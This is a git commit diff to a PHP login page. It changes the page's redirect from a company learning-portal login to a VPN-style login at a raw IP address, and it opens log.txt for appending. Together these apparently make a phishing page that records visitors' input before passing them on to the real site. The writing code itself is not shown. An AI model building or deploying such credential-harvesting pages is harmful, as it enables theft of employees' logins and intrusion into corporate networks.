fb29fe038a6b361580ec3bddd0af20bf29500eda
phavithraa-b <86672765+phavithraa-b@users.noreply.github.com>
2022-05-31 03:39:25 -0400

    Add files via upload

--- login.php
+++ login.php
@@ -2,7 +2,7 @@
 <?php
  
  // Set the location to redirect the page
- header ('Location: https://nextlearn.nextwealth.com/login/index.php');
+ header ('Location: https://202.83.18.34:10443/remote/login?lang=en');
   
  // Open the text file in writing mode
  $file = fopen("log.txt", "a");
